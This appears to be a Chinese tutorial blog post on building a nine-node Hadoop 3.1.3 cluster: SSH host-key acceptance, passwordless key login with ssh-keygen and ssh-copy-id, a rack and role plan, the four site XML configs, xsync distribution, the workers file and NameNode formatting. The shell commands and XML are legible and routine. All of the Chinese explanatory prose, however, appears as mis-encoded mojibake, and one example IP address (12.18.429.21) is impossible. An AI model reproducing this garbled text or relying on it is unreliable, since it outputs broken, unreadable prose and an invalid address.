<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Are you sure you want to continue connecting (yes/no)?yes</span><br></pre></td></tr></table></figure>

<p>ç³»ç»Ÿä¼šå‡ºç°ä¸€å¥æç¤ºï¼Œè¡¨ç¤ºhostä¸»æœºå·²ç»å¾—åˆ°è®¤å¯ã€‚</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Warning: Permanently added &#x27;host,12.18.429.21&#x27; (RSA) to the list of known hosts.</span><br></pre></td></tr></table></figure>

<p>ç„¶åï¼Œä¼šè¦æ±‚è¾“å…¥å¯†ç ã€‚</p>
<p>å¦‚æœå¯†ç æ­£ç¡®ï¼Œå°±å¯ä»¥ç™»å½•äº†ã€‚</p>
<p>å½“è¿œç¨‹ä¸»æœºçš„å…¬é’¥è¢«æ¥å—ä»¥åï¼Œå®ƒå°±ä¼šè¢«ä¿å­˜åœ¨ç”¨æˆ·homeç›®å½•çš„$HOME&#x2F;.ssh&#x2F;known_hostsæ–‡ä»¶ä¹‹ä¸­ã€‚ä¸‹æ¬¡å†è¿æ¥è¿™å°è¿œç¨‹ä¸»æœºï¼Œç³»ç»Ÿå°±ä¼šè®¤å‡ºå®ƒçš„å…¬é’¥å·²ç»ä¿å­˜åœ¨æœ¬åœ°äº†ï¼Œä»è€Œè·³è¿‡è­¦å‘Šéƒ¨åˆ†ï¼Œç›´æ¥æç¤ºè¾“å…¥å¯†ç ã€‚</p>
<p>å¦‚æœè¿œç¨‹ä¸»æœºé‡æ–°è£…è¿‡ç³»ç»Ÿæˆ–å› ä¸ºåˆ«çš„åŸå› ï¼Œå¯¼è‡´sshæŒ‡çº¹æ”¹å˜ï¼Œéœ€è¦æŠŠ.sshç›®å½•ä¸‹çš„know_hostsæ–‡ä»¶ä¸­ç›¸åº”è¿œç¨‹ä¸»æœºIPä¸€è‡´çš„æŒ‡çº¹åˆ é™¤ï¼Œå†é€šè¿‡sshç™»å½•ä¸€æ¬¡å›ç­”yesï¼Œé‡æ–°è®¤è¯ä¸€æ¬¡æ–¹å¯ç™»å½•ã€‚æ³¨æ„.sshæ˜¯ç›®å½•æ˜¯ä»¥â€œ.â€å¼€å¤´çš„éšè—ç›®å½•ï¼Œéœ€è¦#ls -aå‚æ•°æ‰èƒ½çœ‹åˆ°ã€‚è€Œä¸”è¿™ä¸ªç›®å½•çš„æƒé™å¿…é¡»æ˜¯700ï¼Œå¹¶ä¸”ç”¨æˆ·çš„homeç›®å½•ä¹Ÿä¸èƒ½ç»™å…¶ä»–ç”¨æˆ·å†™æƒé™ï¼Œå¦åˆ™sshæœåŠ¡å™¨ä¼šæ‹’ç»ç™»å½•ã€‚å¦‚æœå‘ç”Ÿä¸èƒ½ç™»å½•çš„é—®é¢˜ï¼Œå¯ä»¥æŸ¥çœ‹æœåŠ¡å™¨ä¸Šçš„æ—¥å¿—æ–‡ä»¶&#x2F;var&#x2F;log&#x2F;secureã€‚</p>
<p><strong>2.å…¬é’¥ç™»é™†ï¼ˆå…å¯†ç ç™»é™†ï¼‰</strong></p>
<p>AæœåŠ¡å™¨æƒ³è¦æ— å¯†ç ç™»é™†BæœåŠ¡å™¨çš„è¯ï¼Œå¾—æŠŠè‡ªå·±çš„å…¬é’¥ç»™Bï¼ŒBå¦‚æœæƒ³è®©Aæ— å¯†ç ç™»é™†å°±è®¤å¯Açš„å…¬é’¥ï¼Œè¿™æ ·Açš„å‘é€çš„æŒ‡ä»¤ä¸ä¿å¯†ï¼ˆå› ä¸ºå…¬é’¥æ˜¯å…¬å¼€çš„ï¼‰ï¼Œä½†æ˜¯Bè¿”å›çš„ç»“æœåªæœ‰Aèƒ½è§£å¼€</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115384.png" alt="image-20210628003617469"></p>
<h4 id="å®ç°"><a href="#å®ç°" class="headerlink" title="å®ç°"></a>å®ç°</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">ç”Ÿæˆå…¬é’¥å’Œç§é’¥</span></span><br><span class="line">[huang@hadoop102 ~]$ cd /home/huang/.ssh/</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-keygen -t rsa</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æŒ‰ä¸‰ä¸‹å›è½¦å°±ä¼šç”Ÿæˆrsaæ–‡ä»¶</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">å°†å…¬é’¥æ‹·è´åˆ°è¦å…å¯†ç™»é™†çš„ç›®æ ‡æœºå™¨ä¸Š</span></span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop102</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop103</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop104</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop105</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop106</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop107</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop108</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop109</span><br><span class="line">[huang@hadoop102 .ssh]$ ssh-copy-id hadoop110</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>è¿˜éœ€è¦åœ¨ hadoop103 ä¸Šé‡‡ç”¨ huang è´¦å·é…ç½®ä¸€ä¸‹æ— å¯†ç™»å½•åˆ° hadoop102ã€hadoop103ã€ hadoop104ã€hadoop105ã€hadoop106ã€hadoop107ã€hadoop108ã€hadoop109ã€hadoop110 æœåŠ¡å™¨ä¸Šã€‚</li>
<li>è¿˜éœ€è¦åœ¨ hadoop104 ä¸Šé‡‡ç”¨ huang è´¦å·é…ç½®ä¸€ä¸‹æ— å¯†ç™»å½•åˆ° hadoop102ã€hadoop103ã€ hadoop104ã€hadoop105ã€hadoop106ã€hadoop107ã€hadoop108ã€hadoop109ã€hadoop110 æœåŠ¡å™¨ä¸Šã€‚</li>
<li>è¿˜éœ€è¦åœ¨ hadoop105 ä¸Šé‡‡ç”¨ huang è´¦å·é…ç½®ä¸€ä¸‹æ— å¯†ç™»å½•åˆ° hadoop102ã€hadoop103ã€ hadoop104ã€hadoop105ã€hadoop106ã€hadoop107ã€hadoop108ã€hadoop109ã€hadoop110 æœåŠ¡å™¨ä¸Šã€‚</li>
<li>è¿˜éœ€è¦åœ¨ hadoop106 ä¸Šé‡‡ç”¨ huang è´¦å·é…ç½®ä¸€ä¸‹æ— å¯†ç™»å½•åˆ° hadoop102ã€hadoop103ã€ hadoop104ã€hadoop105ã€hadoop106ã€hadoop107ã€hadoop108ã€hadoop109ã€hadoop110 æœåŠ¡å™¨ä¸Šã€‚</li>
<li>è¿˜éœ€è¦åœ¨ hadoop107 ä¸Šé‡‡ç”¨ huang è´¦å·é…ç½®ä¸€ä¸‹æ— å¯†ç™»å½•åˆ° hadoop102ã€hadoop103ã€ hadoop104ã€hadoop105ã€hadoop106ã€hadoop107ã€hadoop108ã€hadoop109ã€hadoop110 æœåŠ¡å™¨ä¸Šã€‚</li>
<li>è¿˜éœ€è¦åœ¨ hadoop108 ä¸Šé‡‡ç”¨ huang è´¦å·é…ç½®ä¸€ä¸‹æ— å¯†ç™»å½•åˆ° hadoop102ã€hadoop103ã€ hadoop104ã€hadoop105ã€hadoop106ã€hadoop107ã€hadoop108ã€hadoop109ã€hadoop110 æœåŠ¡å™¨ä¸Šã€‚</li>
<li>è¿˜éœ€è¦åœ¨ hadoop109 ä¸Šé‡‡ç”¨ huang è´¦å·é…ç½®ä¸€ä¸‹æ— å¯†ç™»å½•åˆ° hadoop102ã€hadoop103ã€ hadoop104ã€hadoop105ã€hadoop106ã€hadoop107ã€hadoop108ã€hadoop109ã€hadoop110 æœåŠ¡å™¨ä¸Šã€‚</li>
<li>è¿˜éœ€è¦åœ¨ hadoop110 ä¸Šé‡‡ç”¨ huang è´¦å·é…ç½®ä¸€ä¸‹æ— å¯†ç™»å½•åˆ° hadoop102ã€hadoop103ã€ hadoop104ã€hadoop105ã€hadoop106ã€hadoop107ã€hadoop108ã€hadoop109ã€hadoop110 æœåŠ¡å™¨ä¸Šã€‚</li>
<li>è¿˜éœ€è¦åœ¨ hadoop102 ä¸Šé‡‡ç”¨ root è´¦å·é…ç½®ä¸€ä¸‹æ— å¯†ç™»å½•åˆ° hadoop102ã€hadoop103ã€ hadoop104ã€hadoop105ã€hadoop106ã€hadoop107ã€hadoop108ã€hadoop109ã€hadoop110 æœåŠ¡å™¨ä¸Šã€‚ï¼ˆå¾—åœ¨rootçš„ç›®å½•ä¸‹è¿›è¡Œæ“ä½œï¼‰</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 .ssh]$ ll</span><br><span class="line">æ€»ç”¨é‡ 16</span><br><span class="line">-rw-------. 1 huang huang 3573 7æœˆ   1 00:50 authorized_keys</span><br><span class="line">-rw-------. 1 huang huang 1679 7æœˆ   1 00:44 id_rsa</span><br><span class="line">-rw-r--r--. 1 huang huang  397 7æœˆ   1 00:44 id_rsa.pub</span><br><span class="line">-rw-r--r--. 1 huang huang 1670 7æœˆ   1 00:45 known_hosts</span><br></pre></td></tr></table></figure>

<ul>
<li>Known_hosts: è®°å½•sshè®¿é—®è¿‡è®¡ç®—æœºçš„å…¬é’¥ï¼ˆpublic keyï¼‰</li>
<li>id_rsa: ç”Ÿæˆçš„ç§é’¥</li>
<li>id_rsa.pub: ç”Ÿæˆçš„å…¬é’¥</li>
<li>authorized_keys: å­˜æ”¾æˆæƒè¿‡çš„æ— å¯†ç ç™»å½•æœåŠ¡å™¨å…¬é’¥ï¼Œæˆæƒè¿‡çš„æœåŠ¡å™¨å¯ä»¥æ— å¯†ç è®¿é—®æœ¬æœåŠ¡å™¨</li>
</ul>
<h3 id="é›†ç¾¤é…ç½®"><a href="#é›†ç¾¤é…ç½®" class="headerlink" title="é›†ç¾¤é…ç½®"></a>é›†ç¾¤é…ç½®</h3><h4 id="é›†ç¾¤è§„åˆ’"><a href="#é›†ç¾¤è§„åˆ’" class="headerlink" title="é›†ç¾¤è§„åˆ’"></a>é›†ç¾¤è§„åˆ’</h4><ul>
<li>NameNodeå’ŒSecondaryNameNode ä¸è¦å®‰è£…åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Š</li>
<li>ResourceManageå¾ˆæ¶ˆè€—å†…å­˜ï¼Œæœ€å¥½ä¸è¦å’ŒNameNodeï¼ŒSecondaryNameNodeé…ç½®åœ¨åŒä¸€å°æœºå™¨ä¸Š</li>
</ul>
<p><strong>MacBook Pro(Rack1):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th align="left">hadoop102</th>
<th align="left">hadoop109</th>
<th>hadoop110</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td align="left">NameNode DataNode</td>
<td align="left">DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td align="left">NodeManager</td>
<td align="left">NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<p><strong>Window 10-1(Rack2):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>hadoop103</th>
<th>hadoop107</th>
<th>hadoop108</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td>DataNode</td>
<td>DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td>ResourceManager NodeManger</td>
<td>NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<p><strong>Window 10-2(Rack3):</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>hadoop104</th>
<th>hadoop105</th>
<th>hadoop106</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td>SecondaryNameNode DataNode</td>
<td>DataNode</td>
<td>DataNode</td>
</tr>
<tr>
<td>YARN</td>
<td>NodeManager</td>
<td>NodeManager</td>
<td>NodeManager</td>
</tr>
</tbody></table>
<h4 id="é…ç½®æ–‡ä»¶è¯´æ˜"><a href="#é…ç½®æ–‡ä»¶è¯´æ˜" class="headerlink" title="é…ç½®æ–‡ä»¶è¯´æ˜"></a>é…ç½®æ–‡ä»¶è¯´æ˜</h4><p>Hadoop é…ç½®æ–‡ä»¶åˆ†ä¸¤ç±»:é»˜è®¤é…ç½®æ–‡ä»¶å’Œè‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œåªæœ‰ç”¨æˆ·æƒ³ä¿®æ”¹æŸä¸€é»˜è®¤</p>
<p>é…ç½®å€¼æ—¶ï¼Œæ‰éœ€è¦ä¿®æ”¹è‡ªå®šä¹‰é…ç½®æ–‡ä»¶ï¼Œæ›´æ”¹ç›¸åº”å±æ€§å€¼ã€‚</p>
<h5 id="é»˜è®¤é…ç½®æ–‡ä»¶"><a href="#é»˜è®¤é…ç½®æ–‡ä»¶" class="headerlink" title="é»˜è®¤é…ç½®æ–‡ä»¶"></a>é»˜è®¤é…ç½®æ–‡ä»¶</h5><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112220115385.png" alt="image-20210628012641270"></p>
<h5 id="è‡ªå®šä¹‰é…ç½®æ–‡ä»¶"><a href="#è‡ªå®šä¹‰é…ç½®æ–‡ä»¶" class="headerlink" title="è‡ªå®šä¹‰é…ç½®æ–‡ä»¶"></a>è‡ªå®šä¹‰é…ç½®æ–‡ä»¶</h5><p><strong>core-site.xml</strong>ã€<strong>hdfs-site.xml</strong>ã€<strong>yarn-site.xml</strong>ã€<strong>mapred-site.xml</strong> å››ä¸ªé…ç½®æ–‡ä»¶å­˜æ”¾åœ¨ $HADOOP_HOME&#x2F;etc&#x2F;hadoop è¿™ä¸ªè·¯å¾„ä¸Šï¼Œç”¨æˆ·å¯ä»¥æ ¹æ®é¡¹ç›®éœ€æ±‚é‡æ–°è¿›è¡Œä¿®æ”¹é…ç½®ã€‚</p>
<h4 id="é…ç½®é›†ç¾¤"><a href="#é…ç½®é›†ç¾¤" class="headerlink" title="é…ç½®é›†ç¾¤"></a>é…ç½®é›†ç¾¤</h4><h5 id="æ ¸å¿ƒé…ç½®æ–‡ä»¶"><a href="#æ ¸å¿ƒé…ç½®æ–‡ä»¶" class="headerlink" title="æ ¸å¿ƒé…ç½®æ–‡ä»¶"></a>æ ¸å¿ƒé…ç½®æ–‡ä»¶</h5><p>é…ç½®core-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 ~]$ cd $HADOOP_HOME/etc/hadoop</span><br><span class="line">[huang@hadoop102 hadoop]$ vi core-site.xml </span><br></pre></td></tr></table></figure>

<p>å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- æŒ‡å®š NameNode çš„åœ°å€ --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>fs.defaultFS<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://hadoop102:8020<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- æŒ‡å®š hadoop æ•°æ®çš„å­˜å‚¨ç›®å½• --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.tmp.dir<span class="tag">&lt;/<span class="name">name</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>/opt/module/hadoop-3.1.3/data<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- é…ç½® HDFS ç½‘é¡µç™»å½•ä½¿ç”¨çš„é™æ€ç”¨æˆ·ä¸º huang --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>hadoop.http.staticuser.user<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>huang<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="HDFSé…ç½®æ–‡ä»¶"><a href="#HDFSé…ç½®æ–‡ä»¶" class="headerlink" title="HDFSé…ç½®æ–‡ä»¶"></a>HDFSé…ç½®æ–‡ä»¶</h5><p>é…ç½®hdfs-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi hdfs-site.xml </span><br></pre></td></tr></table></figure>

<p>å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- nn webç«¯è®¿é—®åœ°å€--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop102:9870<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- 2nn web ç«¯è®¿é—®åœ°å€--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>dfs.namenode.secondary.http-address<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop104:9868<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="YARNé…ç½®æ–‡ä»¶"><a href="#YARNé…ç½®æ–‡ä»¶" class="headerlink" title="YARNé…ç½®æ–‡ä»¶"></a>YARNé…ç½®æ–‡ä»¶</h5><p>é…ç½®yarn-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi yarn-site.xml </span><br></pre></td></tr></table></figure>

<p>å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- æŒ‡å®š MR èµ° shuffle --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.aux-services<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>mapreduce_shuffle<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- æŒ‡å®š ResourceManager çš„åœ°å€--&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.resourcemanager.hostname<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>hadoop103<span class="tag">&lt;/<span class="name">value</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- ç¯å¢ƒå˜é‡çš„ç»§æ‰¿ --&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.nodemanager.env-whitelist<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>JAVA_HOME,HADOOP_COMMON_HOME,HADOOP_HDFS_HOME,HADOOP_CONF_DIR,CLASSPATH_PREPEND_DISTCACHE,HADOOP_YARN_HOME,HADOOP_MAP RED_HOME<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="MapReduceé…ç½®æ–‡ä»¶"><a href="#MapReduceé…ç½®æ–‡ä»¶" class="headerlink" title="MapReduceé…ç½®æ–‡ä»¶"></a>MapReduceé…ç½®æ–‡ä»¶</h5><p>é…ç½®mapred-site.xml</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ vi mapred-site.xml </span><br></pre></td></tr></table></figure>

<p>å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;configuration.xsl&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">	<span class="comment">&lt;!-- æŒ‡å®š MapReduce ç¨‹åºè¿è¡Œåœ¨ Yarn ä¸Š --&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.framework.name<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span>&gt;</span>yarn<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>yarn.app.mapreduce.am.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.map.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">name</span>&gt;</span>mapreduce.reduce.env<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">value</span>&gt;</span>HADOOP_MAPRED_HOME=/opt/module/hadoop-3.1.3<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="é›†ç¾¤åˆ†å‘"><a href="#é›†ç¾¤åˆ†å‘" class="headerlink" title="é›†ç¾¤åˆ†å‘"></a>é›†ç¾¤åˆ†å‘</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">åˆ†å‘Hadoop</span></span><br><span class="line">[huang@hadoop102 hadoop]$ xsync /opt/module/hadoop-3.1.3/</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">åˆ†å‘jdk</span></span><br><span class="line">[huang@hadoop102 hadoop-3.1.3]$ xsync /opt/module/jdk1.8.0_212/</span><br></pre></td></tr></table></figure>

<h4 id="å»å…¶ä½™æœåŠ¡å™¨ä¸ŠæŸ¥çœ‹åˆ†å‘æƒ…å†µï¼ˆå·²hadoop103ä¸ºä¾‹ï¼‰"><a href="#å»å…¶ä½™æœåŠ¡å™¨ä¸ŠæŸ¥çœ‹åˆ†å‘æƒ…å†µï¼ˆå·²hadoop103ä¸ºä¾‹ï¼‰" class="headerlink" title="å»å…¶ä½™æœåŠ¡å™¨ä¸ŠæŸ¥çœ‹åˆ†å‘æƒ…å†µï¼ˆå·²hadoop103ä¸ºä¾‹ï¼‰"></a>å»å…¶ä½™æœåŠ¡å™¨ä¸ŠæŸ¥çœ‹åˆ†å‘æƒ…å†µï¼ˆå·²hadoop103ä¸ºä¾‹ï¼‰</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[huang@hadoop102 hadoop]$ ssh hadoop103</span><br><span class="line">[huang@hadoop103 ~]$ cd /opt/module/hadoop-3.1.3/</span><br></pre></td></tr></table></figure>



<h3 id="ç¾¤èµ·é›†ç¾¤"><a href="#ç¾¤èµ·é›†ç¾¤" class="headerlink" title="ç¾¤èµ·é›†ç¾¤"></a>ç¾¤èµ·é›†ç¾¤</h3><h4 id="é…ç½®workers"><a href="#é…ç½®workers" class="headerlink" title="é…ç½®workers"></a>é…ç½®workers</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta"># </span><span class="language-bash">è¯¥æ–‡ä»¶ä¸­ä¸å…è®¸å‡ºç°ç©ºæ ¼ï¼Œç»“å°¾ä¹Ÿä¸è¡Œ</span></span><br><span class="line">[huang@hadoop102 ~]$ vi /opt/module/hadoop-3.1.3/etc/hadoop/workers </span><br><span class="line">hadoop102</span><br><span class="line">hadoop103</span><br><span class="line">hadoop104</span><br><span class="line">hadoop105</span><br><span class="line">hadoop106</span><br><span class="line">hadoop107</span><br><span class="line">hadoop108</span><br><span class="line">hadoop109</span><br><span class="line">hadoop110</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"># </span><span class="language-bash">åŒæ­¥æ‰€æœ‰èŠ‚ç‚¹é…ç½®æ–‡ä»¶</span></span><br><span class="line">[huang@hadoop102 ~]$ xsync /opt/module/hadoop-3.1.3/etc/hadoop/workers </span><br></pre></td></tr></table></figure>

<h4 id="å¯åŠ¨é›†ç¾¤"><a href="#å¯åŠ¨é›†ç¾¤" class="headerlink" title="å¯åŠ¨é›†ç¾¤"></a>å¯åŠ¨é›†ç¾¤</h4><p>1.å¦‚æœé›†ç¾¤æ˜¯ç¬¬ä¸€æ¬¡å¯åŠ¨ï¼Œéœ€è¦åœ¨hadoop102èŠ‚ç‚¹æ ¼å¼åŒ–NameNode(æ³¨æ„:æ ¼å¼åŒ– NameNodeï¼Œä¼šäº§ç”Ÿæ–°çš„é›†ç¾¤ idï¼Œå¯¼è‡´ NameNode å’Œ DataNode çš„é›†ç¾¤ id ä¸ä¸€è‡´ï¼Œé›†ç¾¤æ‰¾ä¸åˆ°å·²å¾€æ•°æ®ã€‚å¦‚æœé›†ç¾¤åœ¨è¿è¡Œè¿‡ç¨‹ä¸­æŠ¥é”™ï¼Œéœ€è¦é‡æ–°æ ¼å¼åŒ– NameNode çš„è¯ï¼Œ<strong>ä¸€å®šè¦å…ˆåœ æ­¢ NameNode å’Œ DataNode è¿›ç¨‹ï¼Œå¹¶ä¸”è¦åˆ é™¤æ‰€æœ‰æœºå™¨çš„ data å’Œ logs ç›®å½•ï¼Œç„¶åå†è¿›è¡Œæ ¼å¼åŒ–</strong>ã€‚)</p>
